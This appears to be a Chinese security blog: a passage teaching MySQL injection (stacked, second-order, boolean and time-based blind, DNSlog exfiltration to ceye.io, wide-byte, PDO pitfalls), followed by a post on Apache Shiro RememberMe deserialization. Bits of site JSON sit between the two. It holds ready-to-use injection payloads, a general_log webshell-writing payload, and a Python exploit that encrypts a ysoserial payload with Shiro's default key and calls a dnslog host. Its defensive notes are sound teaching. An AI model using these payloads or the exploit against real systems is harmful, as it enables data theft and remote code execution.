堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中 1234567891011121314151617181920mysql&gt; select * from math;select user();+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec)+----------------+| user() |+----------------+| root@localhost |+----------------+1 row in set (0.00 sec) 而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 原理： mysql_query与mysqli-&gt;multi_query() mysql_query() 函数执行一条 MySQL 查询。 mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。 利用配合日志getshell 12id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\\\wwwroot\\\\web\\\\shell.php&#39;;#id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;# 二次注入 原理： 用户第一次输入的数据，经过各种函数处理比如addslashes或者get_magic_quotes_gpc之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。 实例： sqlib-24 我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。 程序从数据库中取出脏数据后，执行的sql语句就是 1UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; 盲注 原理： 指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。 盲注分为两类： 1.布尔盲注 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 2.时间盲注 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 常用函数 IF()1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 MID()MID() 函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name; 12345678910111213141516171819202122232425mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);+----------------------+| MID(&#39;NowaMagic&#39;,1,2) |+----------------------+| No |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);+----------------------+| MID(&#39;NowaMagic&#39;,1,3) |+----------------------+| Now |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);+----------------------+| MID(&#39;NowaMagic&#39;,0,3) |+----------------------+| |+----------------------+1 row in set (0.00 sec)mysql&gt; substr() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);+-------------------------+| substr(&#39;NowaMagic&#39;,1,1) |+-------------------------+| N |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);+-------------------------+| substr(&#39;NowaMagic&#39;,2,1) |+-------------------------+| o |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);+-------------------------+| substr(&#39;NowaMagic&#39;,3,1) |+-------------------------+| w |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);+-------------------------+| substr(&#39;NowaMagic&#39;,1,2) |+-------------------------+| No |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);+-------------------------+| substr(&#39;NowaMagic&#39;,0,2) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);+-------------------------+| substr(&#39;NowaMagic&#39;,0,1) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec) case() 1234567891011121314151617181920212223mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| two |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| one |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| more |+------------------------------------------------------------+1 row in set (0.00 sec) ord()ORD() 函数返回字符串第一个字符的 ASCII 值。 ELT(N,str1,str2,str3,…)如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。 123456mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);+---------------------------------------------------------+| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;) |+---------------------------------------------------------+| ej |+---------------------------------------------------------+ sleep()、BENCHMARK() 笛卡尔积 原理： 1AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表 具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。 1SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C; 根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。 实例： 配合if 1select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null)) Get_lock() 加锁机制 在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。 (1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间 (2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。 原理： 尝试对一个字段加锁 1234567mysql&gt; select get_lock(&#39;username&#39;,10); +-------------------------+| get_lock(&#39;username&#39;,10) | +-------------------------+ | 1 | +-------------------------+1 row in set (0.01 sec) 尝试开启另一个客户端 1234567mysql&gt; select get_lock(&#39;username&#39;,10);+-------------------------+| get_lock(&#39;username&#39;,10) |+-------------------------+| 0 |+-------------------------+1 row in set (10.01 sec) 实例： 对有一个字段加锁 1select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1); 再次加锁(配合if) 1select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null); 限制条件： 限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。 其他盲注函数–mysql中用regexp是区分大小写的 lpad和rpad函数 lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。 1234567mysql&gt; select lpad(1,5,2);+-------------+| lpad(1,5,2) |+-------------+| 22221 |+-------------+1 row in set (0.00 sec) 配合盲注 123456789101112131415mysql&gt; select length(lpad(1,(select length(database())),2));+-----------------------------------------------+| length(lpad(1,(select length(database())),2)) |+-----------------------------------------------+| 4 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select lpad(1,(select length(database())),2);+---------------------------------------+| lpad(1,(select length(database())),2) |+---------------------------------------+| 2221 |+---------------------------------------+1 row in set (0.00 sec) like和regexp: Like: % : 匹配0个或任意多个字符 _ : 匹配任意一个字符 1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 判断第一个字符是否是t 1234567mysql&gt; select database() like &#39;t%&#39;;+----------------------+| database() like &#39;t%&#39; |+----------------------+| 1 |+----------------------+1 row in set (0.01 sec) 判断前两个字符是不是te 1234567mysql&gt; select database() like &#39;te%&#39;;+-----------------------+| database() like &#39;te%&#39; |+-----------------------+| 1 |+-----------------------+1 row in set (0.00 sec) 判断是否包含es两个字符 1234567mysql&gt; select database() like &#39;%es%&#39;;+------------------------+| database() like &#39;%es%&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断有几个字符 123456789101112131415mysql&gt; select database() like &#39;_____&#39;;+-------------------------+| database() like &#39;_____&#39; |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() like &#39;____&#39;;+------------------------+| database() like &#39;____&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断第一个字符是否t 1234567mysql&gt; select database() like &#39;t___&#39;;+------------------------+| database() like &#39;t___&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) like配合盲注 123456789101112131415mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 1 | 444 || 1 | 444 |+------+-----------+6 rows in set (0.02 sec)mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);Empty set (0.00 sec) 注意点就是如果匹配成功就会返回1否则就是0。 REGEXP: 盲注值正则表达式攻击(^、&amp;) 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; select name from math where id&#x3D;3;+-----------+| name |+-----------+| chengxian |+-----------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;+------------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |+------------------------------------------------+| 1 |+------------------------------------------------+1 row in set (0.00 sec) 123regexp &#39;^[a-z]&#39; #判断一个表的第一个字符串是否在a-z中regexp &#39;^r&#39; #判断第一个字符串是否为rregexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法) 提高盲注速度 DNSlog+盲注 https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html 原理： Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。 通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。 可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。 在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。 Microsoft SQL Server 123使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式： \\\\ComputerName\\SharedFolder\\Resource攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。 条件： 1、secure_file_priv为空 2、目标系统是windows，能够使用UNC路径 实例： 构造sql语句 1SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\\\abc&#39;))) 四个\\，其中两个用来转义。DNSlog平台接受信息 常用payload布尔盲注 判断数据库的类型 12345678//判断是否是 Mysql数据库1&#x27; and exists(select*from information_schema.tables) #//判断是否是 access数据库1&#x27; and exists(select*from msysobjects) #//判断是否是 Sqlserver数据库1&#x27; and exists(select*from sysobjects) #//判断是否是Oracle数据库1&#x27; and (select count(*) from dual)&gt;0 # 判断数据库长度 11&#39; and length(database())&gt;5 判断数据库的名字 11&#39; and ascii(substr(database(),1,1))&gt;100 判断数据库中是否存在某个表 11&#39; and exists(select*from admin) 判断数据库中表的数量 11&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5 # 判断数据库中表的长度 11&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6 判断数据库中表的名字 11&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 # 判断数据库中的表中是否存在某个字段 11&#39; and exists(select username from admin) 判断数据库中的表的字段的数量 11&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)&gt;5 # 判断数据库中表的字段的长度 11&#39; and length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1))&gt;5 判断数据库中表的字段的名字 11&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;100 判断字段中的数据的长度 11&#39; and length((select id from users limit 0,1))&gt;5 判断字段中的数据的值 11&#x27; and ascii(substr((select id from users limit 0,1),1,1))&gt;100 时间盲注 判断时间盲注 11&#x27; and sleep(5)# 判断数据库的长度 11&#x27; and if(length(database())=5,1,sleep(5)) # 判断数据库的名字 11&#x27; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) # 同理数据库的表、字段、值。 宽字节注入造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。 GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。 比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。 应用程序的编码 以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启default_charset编码时，php的默认编码为空， 123; PHP&#39;s built-in default is text&#x2F;htmldefault_mimetype &#x3D; &quot;text&#x2F;html&quot;;default_charset &#x3D; &quot;iso-8859-1&quot; 此时php会根据数据库中的编码自动来确定使用那种编码，可以使用&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt; 来进行判断，如果输出的值是3说明是utf-8编码。如果输出的值是2说明是gbk编码； SET NAMES &#39;GBK&#39;语句与这三个语句等价： 123mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;; 三个语句的作用是： 当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。 当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。 使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子 123单引号（&#39;）&#x3D; （\\&#39;）双引号（&quot;） &#x3D; （\\&quot;）反斜杠（\\） &#x3D; （\\\\） 比如我们输入 1id&#x3D;%df%27 会被进行如下转换 %df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ 因为数据库设置了GBK编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。 防御： 对于宽字节编码，有一种最好的修补就是： （1）使用mysql_set_charset(GBK)指定字符集 （2）使用mysql_real_escape_string进行转义 1原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。 （3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。 PDO技术mysql的预编译 当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。 模拟预处理 模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行 模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。 非模拟预处理 1234567891011121314PDO::ATTR_EMULATE_PREPARES =&gt; false&lt;?php$params = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES =&gt; false,];$db = new PDO(&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, $params);try &#123; $link = $db-&gt;prepare(&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;);&#125; catch (\\PDOException $e) &#123; var_dump($e);&#125; 可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程， 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。 在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。 预编译可以完全杜绝注入攻击吗 在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。 总结 1231、使用PDO时尽量使用非模拟预处理。2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。3、SQL语句模板不使用变量动态拼接生成 关于orderby不能参数化查询的问题 原因： order by后面拼接字段名，字段名不能加引号。 在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。 insert、update注入利用报错注入12insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句 or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- 无回显注入(盲注) 利用xor、||、&amp;&amp;、+,-,*,/ 1234567mysql&gt; select (sleep(10));+-------------+| (sleep(10)) |+-------------+| 0 |+-------------+1 row in set (10.00 sec) 实例： 1234567891011121314151617mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.02 sec)mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.03 sec)mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.09 sec)mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.01 sec) 配合if、substr等函数进行盲注。 12345mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (10.00 sec) 有回显注入(符号) 实例： 按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。 这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#int型按位或mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from steady;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657374 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#int型按位异或mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from ctf;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657338 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(100^74657338);+---------------------+| unhex(100^74657338) |+---------------------+| test |+---------------------+1 row in set (0.00 sec)#字符型按位或mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657374 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#字符型按位异或mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657338 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(&#39;100&#39;^74657338);+-----------------------+| unhex(&#39;100&#39;^74657338) |+-----------------------+| test |+-----------------------+1 row in set (0.00 sec) mysql运算符 按位或运算符–｜ 0与任意的数字b或都为b 1234567891011121314151617181920212223mysql&gt; mysql&gt; select (0|1);+-------+| (0|1) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select (0|2323);+----------+| (0|2323) |+----------+| 2323 |+----------+1 row in set (0.01 sec)mysql&gt; select (0|452323);+------------+| (0|452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec) 按位异或运算符–^ 0与任意的数字b异或都是b 12345678910111213141516mysql&gt; select (0^452323);+------------+| (0^452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec)mysql&gt; select (0^5644);+----------+| (0^5644) |+----------+| 5644 |+----------+1 row in set (0.00 sec) 其他数字a与任意数字b异或得到c 可以通过c与a异或得到b，通常b是我们sql注入想要的数据库 123456789101112131415mysql&gt; select (10^5644);+-----------+| (10^5644) |+-----------+| 5638 |+-----------+1 row in set (0.00 sec)mysql&gt; select (10^5638);+-----------+| (10^5638) |+-----------+| 5644 |+-----------+1 row in set (0.00 sec) 补充1、mysql的网站注入，5.0以上和5.0以下有什么区别？ MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。 5.0以下是多用户单操作，5.0以上是多用户多操做。","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"http://s1eady.top/categories/OWASP-TOP10/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"Shiro安全","slug":"Apache_Shiro反序列化漏洞","date":"2020-03-27T05:32:30.000Z","updated":"2020-10-16T11:47:17.853Z","comments":true,"path":"2020/03/27/Apache_Shiro反序列化漏洞/","link":"","permalink":"http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Shiro安全简介Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。 Shiro的功能 验证用户身份 用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限 在非 Web 或 EJB 容器的环境下可以任意使用Session API 可以响应认证、访问控制，或者 Session 生命周期中发生的事件 可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图) 支持单点登录(SSO)功能 支持提供“Remember Me”服务，获取用户关联信息而无需登录 Apache Shiro 反序列化漏洞实战漏洞原理Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。 RememberMe1、检索RememberMe cookie 的值2、Base 64解码3、使用AES解密(加密密钥硬编码)4、进行反序列化操作（未作过滤处理） 在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。 用户登录凭证的生成，加密顺序： Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容 在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为： remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。 漏洞利用由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。 1、AES加密是硬编码。 2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。 漏洞特征如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。 使用burp测试 输入密码之后返回包中看到敏感字段 直接浏览器查看请求 fofa、shodan、zoomeye 1header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot; ysoserialysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。 RMI简介Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 RMI的序列化和反序列化在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。 EXP12345678910111213141516171819202122232425262728293031# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64import systarget = &quot;http://127.0.0.1:8080/doLogin&quot;jar_file = &#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;cipher_key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;# 创建 rememberme的值popen = subprocess.Popen([&#x27;java&#x27;,&#x27;-jar&#x27;,jar_file, &quot;URLDNS&quot;, &quot;http://95d950.dnslog.cn&quot;], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送requesttry: r = requests.get(target, cookies=&#123;&#x27;rememberMe&#x27;:base64_ciphertext.decode()&#125;, timeout=30) print(r.status_code)except: traceback.print_exc() 195d950.dnslog.cn 112.25.12.136 2020-10-10 10:07:12 